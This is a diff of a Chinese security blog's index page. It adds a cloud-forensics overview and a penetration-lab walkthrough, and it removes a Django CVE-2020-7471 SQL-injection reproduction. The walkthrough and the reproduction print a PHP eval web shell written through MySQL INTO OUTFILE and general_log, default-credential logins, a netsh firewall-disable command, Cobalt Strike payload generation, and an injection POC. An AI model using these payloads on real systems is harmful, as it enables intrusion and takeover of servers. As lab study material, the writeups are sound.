@@ -149,6 +149,104 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/05/22/%E4%BA%91%E8%AE%A1%E7%AE%97%E5%8F%96%E8%AF%81%E7%BB%BC%E8%BF%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="swanQ">
+      <meta itemprop="description" content="Try & Enjoy">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="SwanQ's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/05/22/%E4%BA%91%E8%AE%A1%E7%AE%97%E5%8F%96%E8%AF%81%E7%BB%BC%E8%BF%B0/" class="post-title-link" itemprop="url">云计算取证综述</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-05-22 16:55:05 / 修改时间：20:04:59" itemprop="dateCreated datePublished" datetime="2021-05-22T16:55:05+08:00">2021-05-22</time>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>834</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>1 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>由于目前所做项目及论文的原因(具体不便细说)，需要调研云取证，刚好在此做一总结。本篇文章主要是对云环境中电子数据的分析技术作以总结。</p>
+<h1 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h1><p>Ruan K教授从技术、组织和法律三个维度划分云取证领域相关问题。</p>
+<ul>
+<li>技术维度：云计算环境中进行电子数据取证的具体过程和试用的技术和工具。</li>
+<li>组织维度：云计算环境中包含的角色，包括云服务提供商、云服务用户、云服务中介、审计人员和取证人员，不同的角色在云取证活动中的职责不同，他们之间的交互可以促进云取证的实施。法律维度主要关注在涉及跨多个管辖区的法律问题。</li>
+</ul>
+<p>云计算在电子取证领域的领域包括定位电子数据所在虚拟机的物理位置、设计云取证模型等。设计云取证模型是当前云取证研究的主要方向之一，对于云取证工作具有重要的指导意义。本文主要研究云中电子数据的分析技术。</p>
+<h1 id="0x02-云计算-Cloud-Computing"><a href="#0x02-云计算-Cloud-Computing" class="headerlink" title="0x02 云计算(Cloud Computing)"></a>0x02 云计算(Cloud Computing)</h1><p>云计算可以看作是并行计算、分布式计算和网格计算等计算机技术和网络技术的融合和发展。简单来说，云计算是通过网<br>络将庞大的计算处理程序自动分拆成无数个较小的子程序，再交由多部服务器所组成的庞大系统，经搜寻、计算、分析之后将<br>处理结果回传给用户。使用这项技术，网络服务提供者可以在数秒之内，达成处理数以千万计甚至亿计的信息，达到和超级计算<br>机同样强大效能的网络服务。  </p>
+<h1 id="0x03-云环境中电子数据的分析技术研究"><a href="#0x03-云环境中电子数据的分析技术研究" class="headerlink" title="0x03 云环境中电子数据的分析技术研究"></a>0x03 云环境中电子数据的分析技术研究</h1><p>云环境下的电子数据分析：<strong>取证调查人员借助工具、算法对涉案的电子数据进行分析</strong>的过程。主要包括</p>
+<ul>
+<li>数据源分析</li>
+<li>数据恢复</li>
+<li>事件重构</li>
+<li>数据检索</li>
+</ul>
+<p>云环境中的电子数据量大、数据格式多、多源证据时间戳不一致、网络环境复杂等特性为分析证据带来极大的挑战。</p>
+<ol>
+<li><p>数据量巨大：目前的研究思路已经从<strong>分析所有数据的取证</strong>转变为<strong>用机器学习分析取证</strong>；</p>
+</li>
+<li><p>数据源分析困难：借助SDN网络取证分析来实现网络攻击溯源；</p>
+</li>
+</ol>
+<p>然而目前提出的方法均存在局限性，无法有效解决目前的困境。云环境中电子数据的分析方法臻待进一步研究。</p>
+<h4 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h4><ol>
+<li><a target="_blank" rel="noopener" href="https://www.secrss.com/articles/11419">https://www.secrss.com/articles/11419</a></li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/05/14/PenetrationRange/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -172,12 +270,32 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2021-05-14 20:00:13 / 修改时间：21:40:58" itemprop="dateCreated datePublished" datetime="2021-05-14T20:00:13+08:00">2021-05-14</time>
+              <time title="创建时间：2021-05-14 20:00:13" itemprop="dateCreated datePublished" datetime="2021-05-14T20:00:13+08:00">2021-05-14</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-05-22 21:36:22" itemprop="dateModified" datetime="2021-05-22T21:36:22+08:00">2021-05-22</time>
+              </span>
 
-          
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2.4k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>2 分钟</span>
+            </span>
 
         </div>
       </header>
@@ -201,7 +319,7 @@
 <p><img src="/2021/05/14/PenetrationRange/3.png"></p>
 <p>参考下图:<br><img src="/2021/05/14/PenetrationRange/1.png"></p>
 <p>开启win7的phpstudy,同时测试win7是否可以pingkali和内网的两台主机。ping通over，环境搭建到此结束。</p>
-<h1 id="2-攻击流程"><a href="#2-攻击流程" class="headerlink" title="2. 攻击流程"></a>2. 攻击流程</h1><h2 id="0x01-主机发现："><a href="#0x01-主机发现：" class="headerlink" title="0x01 主机发现："></a>0x01 主机发现：</h2><p>DMZ区也就是处于两个防火墙之间的，一个合格的DMZ区是为了提供外部主机访问内网资源服务器的一个缓冲区域，应该有着严格的内外网隔离，本次靶场只是一个模拟，dmz区并没有很合规。</p>
+<h1 id="2-攻击流程"><a href="#2-攻击流程" class="headerlink" title="2. 攻击流程"></a>2. 攻击流程</h1><h2 id="0x01-主机发现"><a href="#0x01-主机发现" class="headerlink" title="0x01 主机发现"></a>0x01 主机发现</h2><p>DMZ区也就是处于两个防火墙之间的，一个合格的DMZ区是为了提供外部主机访问内网资源服务器的一个缓冲区域，应该有着严格的内外网隔离，本次靶场只是一个模拟，dmz区并没有很合规。</p>
 <p>那么入手以后，先进行信息收集，桥接嘛，那么直接扫一下桥接网段的存活主机</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.140.0/24</span><br><span class="line"></span><br><span class="line">netdiscover -i eth0 -r 192.168.140.0/24</span><br></pre></td></tr></table></figure>
 
@@ -213,6 +331,54 @@
 <p><img src="/2021/05/14/PenetrationRange/7.png"></p>
 <p>80端口是一个phpstudy探针：</p>
 <p><img src="/2021/05/14/PenetrationRange/8.png"></p>
+<p>最下方有数据库登陆框测试mysql连同，尝试root/root即可登陆。初步getshell思路就是通过mysql拿shell。</p>
+<p><img src="/2021/05/14/PenetrationRange/9.png"></p>
+<p>目录扫描还是御剑靠谱一点，扫出beifen.rar。</p>
+<p><img src="/2021/05/14/PenetrationRange/10.png"></p>
+<p>备份文件发现网站源码，打开robots.txt发现网站CMS为yxcms，访问<code>http://192.168.1.102/yxcms</code>进入网站首页</p>
+<h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><h3 id="漏洞一：信息泄露-弱口令"><a href="#漏洞一：信息泄露-弱口令" class="headerlink" title="漏洞一：信息泄露+弱口令"></a>漏洞一：信息泄露+弱口令</h3><p>网站<a target="_blank" rel="noopener" href="http://192.168.1.102/yxcms%E5%90%8E%E5%8F%B0%E6%B3%84%E9%9C%B2%E5%90%8E%E5%8F%B0%E7%99%BB%E9%99%86%E5%9C%B0%E5%9D%80%E5%92%8C%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E3%80%82">http://192.168.1.102/yxcms后台泄露后台登陆地址和用户密码。</a></p>
+<p><img src="/2021/05/14/PenetrationRange/11.png"></p>
+<p><img src="/2021/05/14/PenetrationRange/12.png"></p>
+<p>成功登陆后台管理页面，可以添加、编辑、删除管理员，管理数据库及上传文件。</p>
+<h3 id="漏洞二：PhpMyAdmin弱口令"><a href="#漏洞二：PhpMyAdmin弱口令" class="headerlink" title="漏洞二：PhpMyAdmin弱口令"></a>漏洞二：PhpMyAdmin弱口令</h3><p>使用默认用户名/口令（root/root）成功登录PhpMyAdmin管理页面，可以看到数据库的所有内容</p>
+<p><img src="/2021/05/14/PenetrationRange/13.jpg"></p>
+<h3 id="漏洞三：yxcms留言本XSS存储型漏洞"><a href="#漏洞三：yxcms留言本XSS存储型漏洞" class="headerlink" title="漏洞三：yxcms留言本XSS存储型漏洞"></a>漏洞三：yxcms留言本XSS存储型漏洞</h3><p>前台提交带有XSS代码的留言，后台审核成功弹出XSS弹窗，审核通过之后，前台成功弹窗。通过该漏洞可以获取管理员cookie或者诱导管理员点击执行某恶意代码</p>
+<p><img src="/2021/05/14/PenetrationRange/14.jpg"></p>
+<p><img src="/2021/05/14/PenetrationRange/13.png"></p>
+<h3 id="漏洞四：yxcms后台任意文件读写漏洞"><a href="#漏洞四：yxcms后台任意文件读写漏洞" class="headerlink" title="漏洞四：yxcms后台任意文件读写漏洞"></a>漏洞四：yxcms后台任意文件读写漏洞</h3><p>后台管理首页–&gt; 前台模板–&gt;管理模板文件 –&gt;新建hack.php文件</p>
+<p><img src="/2021/05/14/PenetrationRange/14.png"></p>
+<p>找备份文件即可看到文件的保存目录为：<a target="_blank" rel="noopener" href="http://192.168.1.102/yxcms/protected/apps/default/view/default/hack.php">http://192.168.1.102/yxcms/protected/apps/default/view/default/hack.php</a></p>
+<p><img src="/2021/05/14/PenetrationRange/15.jpg"></p>
+<p>使用蚁剑成功连接：</p>
+<p><img src="/2021/05/14/PenetrationRange/15.png"></p>
+<h3 id="漏洞五：PhpMyAdmin开启全局日志getshell"><a href="#漏洞五：PhpMyAdmin开启全局日志getshell" class="headerlink" title="漏洞五：PhpMyAdmin开启全局日志getshell"></a>漏洞五：PhpMyAdmin开启全局日志getshell</h3><ol>
+<li><p>测试是否可以使用into outfile写入文件到web目录：Select ‘<?php eval($_POST[hack]);?> ‘ into outfile ‘C:/phpStudy/WWW/hack.php’。发现写入失败。</p>
+</li>
+<li><p>再查看变量secure-file-priv 值： <code>show global variables like ‘%secure%’</code>发现为NULL，为只读无法修改。</p>
+</li>
+</ol>
+<p><img src="/2021/05/14/PenetrationRange/16.png"></p>
+<p><img src="/2021/05/14/PenetrationRange/17.png"></p>
+<ol start="3">
+<li><p>尝试用全局日志写shell，查看全局变量general_log：<code>show global variables like ‘%general_%’</code>。于是开启全局日志并修改日志保存位置为C:/phpStudy/WWW/hack.php</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log<span class="operator">=</span><span class="keyword">on</span>;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file<span class="operator">=</span><span class="string">&#x27;C:/phpStudy/WWW/hack.php&#x27;</span>;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p><img src="/2021/05/14/PenetrationRange/18.png"></p>
+<p><img src="/2021/05/14/PenetrationRange/19.png"></p>
+<p>查询一句话写入日志<code>Select &#39;&lt;?php eval($_POST[hack]);?&gt;&#39;</code></p>
+<p><img src="/2021/05/14/PenetrationRange/20.png"></p>
+<p>使用蚁剑连接一句话木马<code>http://192.168.140.130/hack.php</code>。web目录直接IP加文件名就好。</p>
+<h3 id="漏洞六：yxcms后台SQL注入漏洞"><a href="#漏洞六：yxcms后台SQL注入漏洞" class="headerlink" title="漏洞六：yxcms后台SQL注入漏洞"></a>漏洞六：yxcms后台SQL注入漏洞</h3><p>待补充。其他博客的资料此处有问题。</p>
+<p>前渗透到此结束，下面为后渗透流程</p>
+<h2 id="0x03-getshell"><a href="#0x03-getshell" class="headerlink" title="0x03 getshell"></a>0x03 getshell</h2><p>此时会用到Cobalt Strike, 以Metasploit为基础的GUI框架式渗透测试工具，集成了端口转发、服务扫描，自动化溢出，多模式端口监听，exe、powershell木马生成等。是团队渗透神器，能让多个攻击者同时连接到团体服务器上，共享攻击资源与目标信息和sessions。对内网的渗透测试和作为apt的控制终端功能，使其变成众多APT组织的首选。</p>
+<p>我们用kali作为CS服务器，用蚁剑给win7上传java 11和CS。CS服务器和CS客户端分别如下：</p>
+<p><img src="/2021/05/14/PenetrationRange/21.png"></p>
+<p><img src="/2021/05/14/PenetrationRange/22.png"></p>
+<p>选择监听器，为后头生成木马做铺垫</p>
+<p>蚁剑关闭防火墙：终端执行：netsh advfirewall set allprofiles state off</p>
+<p><img src="/2021/05/14/PenetrationRange/23.png"></p>
+<p>生成木马artifact.exe.（Attacks -&gt; Packages -&gt; Windows Executable ）,并用蚁剑上传win7。用蚁剑终端执行artifact.exe之后，win7提示artifact.exe已停止工作。</p>
+<p><img src="/2021/05/14/PenetrationRange/24.png"></p>
 
       
     </div>
@@ -266,7 +432,21 @@
                 <time title="修改时间：2021-05-06 17:07:00" itemprop="dateModified" datetime="2021-05-06T17:07:00+08:00">2021-05-06</time>
               </span>
 
-          
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span></span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>NaN:aN</span>
+            </span>
 
         </div>
       </header>
@@ -400,7 +580,21 @@
                 <time title="修改时间：2021-05-03 21:38:39" itemprop="dateModified" datetime="2021-05-03T21:38:39+08:00">2021-05-03</time>
               </span>
 
-          
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span></span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>NaN:aN</span>
+            </span>
 
         </div>
       </header>
@@ -503,7 +697,21 @@
                 <time title="修改时间：2021-05-04 11:34:00" itemprop="dateModified" datetime="2021-05-04T11:34:00+08:00">2021-05-04</time>
               </span>
 
-          
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span></span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>NaN:aN</span>
+            </span>
 
         </div>
       </header>
@@ -850,7 +1058,21 @@
                 <time title="修改时间：2021-04-29 16:46:21" itemprop="dateModified" datetime="2021-04-29T16:46:21+08:00">2021-04-29</time>
               </span>
 
-          
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span></span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>NaN:aN</span>
+            </span>
 
         </div>
       </header>
@@ -945,7 +1167,21 @@
                 <time title="修改时间：2021-04-27 21:33:43" itemprop="dateModified" datetime="2021-04-27T21:33:43+08:00">2021-04-27</time>
               </span>
 
-          
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span></span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>NaN:aN</span>
+            </span>
 
         </div>
       </header>
@@ -1134,7 +1370,21 @@
               <time title="创建时间：2021-04-15 15:23:58 / 修改时间：15:44:59" itemprop="dateCreated datePublished" datetime="2021-04-15T15:23:58+08:00">2021-04-15</time>
             </span>
 
-          
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span></span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>NaN:aN</span>
+            </span>
 
         </div>
       </header>
@@ -1379,7 +1629,21 @@
                 <time title="修改时间：2021-04-20 20:51:01" itemprop="dateModified" datetime="2021-04-20T20:51:01+08:00">2021-04-20</time>
               </span>
 
-          
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span></span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>NaN:aN</span>
+            </span>
 
         </div>
       </header>
@@ -1754,7 +2018,21 @@
               <time title="创建时间：2021-04-01 21:50:29 / 修改时间：22:07:36" itemprop="dateCreated datePublished" datetime="2021-04-01T21:50:29+08:00">2021-04-01</time>
             </span>
 
-          
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span></span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>NaN:aN</span>
+            </span>
 
         </div>
       </header>
@@ -1879,128 +2157,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/03/29/Django-sql/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="swanQ">
-      <meta itemprop="description" content="Try & Enjoy">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="SwanQ's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/03/29/Django-sql/" class="post-title-link" itemprop="url">Django-sql注入漏洞复现-CVE-2020-7471</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-03-29 19:53:21" itemprop="dateCreated datePublished" datetime="2021-03-29T19:53:21+08:00">2021-03-29</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-04-07 09:30:12" itemprop="dateModified" datetime="2021-04-07T09:30:12+08:00">2021-04-07</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>Django作为开放源码的Web应用python框架，作为最有代表性的web框架，构建了多种网站和APP。Django负责处理网站开发中麻烦的部分，因此让开发者专注于应用程序的编写。其采用了MVT的软件设计模式，即模型（Model），视图（View）和模板（Template），注重组件的重用性和“可插拔性”。<br><strong>原理</strong><br>通过构造分隔符，传递给聚合函数contrib.postgres.aggregates.StringAgg，从而绕过转义符号（\）来注入恶意SQL语句。<br>漏洞的核心是StringAgg(delimiter),StringAgg聚合函数的delimiter参数存在SQL注入漏洞。</p>
-<p>介绍下StringAgg，它会将输入的值使用 delimiter 分隔符级联起来。比如</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Info.objects.all().values(&#39;gender&#39;).annotate(mydefinedname&#x3D;StringAgg(&#39;name&#39;, delimiter&#x3D;&quot;-&quot;))</span><br></pre></td></tr></table></figure>
-
-<p>这个查询操作就是查询 Info 对应的 postgres 数据表的 gender 列，将gender相同的 name 列使用横线连接聚合，输入如下：</p>
-<p><img src="/2021/03/29/Django-sql/12.jpg"></p>
-<p>漏洞位于django/django/contrib/postgres/aggregates/general.py</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from django.contrib.postgres.aggregates import StringAgg</span><br></pre></td></tr></table></figure>
-
-<p>可以看到官方使用Value函数来防止注入，Value函数的内容如下</p>
-<p><img src="/2021/03/29/Django-sql/10.jpg"></p>
-<p><img src="/2021/03/29/Django-sql/11.jpg"></p>
-<p>Value参数会被添加到sql参数列表，然后被Django内置的过滤机制过滤，来防注。</p>
-<p>如何导致SQL 注入：<a target="_blank" rel="noopener" href="https://github.com/django/django/tree/6b178a3e930f72069f3cda2e6a09d1b320fc09ec">django</a>/<a target="_blank" rel="noopener" href="https://github.com/django/django/tree/6b178a3e930f72069f3cda2e6a09d1b320fc09ec/django">django</a>/<a target="_blank" rel="noopener" href="https://github.com/django/django/tree/6b178a3e930f72069f3cda2e6a09d1b320fc09ec/django/contrib">contrib</a>/<a target="_blank" rel="noopener" href="https://github.com/django/django/tree/6b178a3e930f72069f3cda2e6a09d1b320fc09ec/django/contrib/postgres">postgres</a>/<a target="_blank" rel="noopener" href="https://github.com/django/django/tree/6b178a3e930f72069f3cda2e6a09d1b320fc09ec/django/contrib/postgres/aggregates">aggregates</a>/general.py</p>
-<p><img src="/2021/03/29/Django-sql/14.jpg"></p>
-<p>delimiter没有任何过滤，我们可以通过闭合单引号来利用注入</p>
-<p><img src="/2021/03/29/Django-sql/4.png"></p>
-<p>(此图摘自先知社区)</p>
-<p>测试发现，当delimiter为单引号时，会报错。可以看出单引号未经过任何转义嵌入到了 SQL 语句中，然后需要追踪内部程序找出完整的 SQL 语句上下文。从上面的图中可以看出来，查询语句调用了self.cursor.execute，sql变量还没嵌入时，delimiter 的值如下：</p>
-<p><img src="/2021/03/29/Django-sql/5.png"></p>
-<p>（此图摘自先知社区）</p>
-<p><img src="/2021/03/29/Django-sql/5.png"></p>
-<p>运行后看到此时sql已加入delimiter为单引号的取值。因为此处sql为字符串，所以需要转义。若是postgres则会执行以下内容：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &quot;vul_app_info&quot;.&quot;gender&quot;, STRING_AGG(&quot;vul_app_info&quot;.&quot;name&quot;, &#39;&#39;&#39;) AS &quot;mydefinedname&quot; FROM &quot;vul_app_info&quot; GROUP BY &quot;vul_app_info&quot;.&quot;gender&quot; LIMIT 1 OFFSET 1</span><br></pre></td></tr></table></figure>
-
-<p>此时三个单引号会导致语法错误，postgres的注释符为’)–。将delimiter设置为<code>&#39;)--</code>，可以成功注释from语句</p>
-<p>为构造合法的上下文，将 delimiter设置为</p>
-<p>**’-&#39;) AS “mydefinedname” FROM “vul_app_info” GROUP BY “vul_app_info”.”gender” LIMIT 1 OFFSET 1 – ‘  **</p>
-<p>输出为</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#39;gender&#39;: &#39;male&#39;, &#39;mydefinedname&#39;: &#39;li-zhao&#39;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>若设置delimiter为<code>-</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delimiter&#x3D;&quot;-&quot;</span><br></pre></td></tr></table></figure>
-
-<p>该语句使用StringAgg类，用于将输入的值使用delimiter分隔符级联。原本的语句中，查询info对应的gender列，并使用-来连接。就可以<strong>通过修改delimiter的内容来实现注入</strong>。</p>
-<p>输出为</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#39;gender&#39;: &#39;female&#39;, &#39;mydefinedname&#39;: &#39;zhang&#39;&#125;</span><br><span class="line">&#123;&#39;gender&#39;: &#39;male&#39;, &#39;mydefinedname&#39;: &#39;li-zhao&#39;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>POC如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; &#39;-&#39;</span><br><span class="line">   results &#x3D; Info.objects.all().values(&#39;gender&#39;).annotate(mydefinedname&#x3D;StringAgg(&#39;name&#39;, delimiter&#x3D;payload))</span><br><span class="line">   for e in results:</span><br><span class="line">       print(e)</span><br><span class="line">   print(&quot;[+]注入后的的输出：&quot;)</span><br><span class="line">   payload &#x3D; &#39;-\&#39;) AS &quot;mydefinedname&quot; FROM &quot;vul_app_info&quot; GROUP BY &quot;vul_app_info&quot;.&quot;gender&quot; LIMIT 1 OFFSET 1 -- &#39;</span><br><span class="line">   results &#x3D; Info.objects.all().values(&#39;gender&#39;).annotate(mydefinedname&#x3D;StringAgg(&#39;name&#39;, delimiter&#x3D;payload))</span><br><span class="line">   for e in results:</span><br><span class="line">       print(e)</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h2><ul>
-<li>影响版本<br>Django 1.11.x &lt; 1.11.28<br>Django 2.2.x &lt; 2.2.10<br>Django 3.0.x &lt; 3.0.3<br>Django 主开发分支<br>其中Django 1.11.28、Django 2.2.10、Django 3.0.3不受影响。</li>
-<li>测试环境<br>kalil<br>Django 3.0.2<h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03 环境搭建"></a>0x03 环境搭建</h2>pip install django==3.0.2<br>安装postgres数据库，创建数据库test,并修改数据库密码<br><img src="/2021/03/29/Django-sql/1.png"><h2 id="0x04-漏洞复现"><a href="#0x04-漏洞复现" class="headerlink" title="0x04 漏洞复现"></a>0x04 漏洞复现</h2></li>
-</ul>
-<ol>
-<li>由于刚才更改了数据库密码，于是更改配置文件的数据库名称以及密码<br>进入CVE-2020-7471/sqlvul_projects/settings.py，修改数据库配置，如果之前安装postgres数据库使用的默认配置（包括密码），这里就不需修改任何任何配置.<br>此处只需修改password为刚才设置密码。<br><img src="/2021/03/29/Django-sql/2.png"><br><img src="/2021/03/29/Django-sql/3.png"></li>
-<li>再利用CVE-2020-7471/manage.py初始化测试数据库test数据库中的表<br><img src="/2021/03/29/Django-sql/4.jpg"><br>初始化环境完成。</li>
-<li>进入test数据库查看表<br>进入数据库<br>\c test<br>查看全部表<br>\d<br><img src="/2021/03/29/Django-sql/5.jpg"><br>查看表vul_app_info的信息<br>select * from vul_app_info;<br><img src="/2021/03/29/Django-sql/6.jpg"><br>可以看到此刻表为空</li>
-<li>执行POC向数据库写入数据<br><img src="/2021/03/29/Django-sql/7.jpg"><br>若执行成功POC中将插入三条数据<br>利用CVE-2020-7471/CVE-2020-7471.py写入数据<br><img src="/2021/03/29/Django-sql/8.jpg"><br><img src="/2021/03/29/Django-sql/9.jpg"><br>写入成功。<h2 id="0x05-漏洞修复"><a href="#0x05-漏洞修复" class="headerlink" title="0x05 漏洞修复"></a>0x05 漏洞修复</h2>升级到Django最新版3.0.3<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3></li>
-</ol>
-<ul>
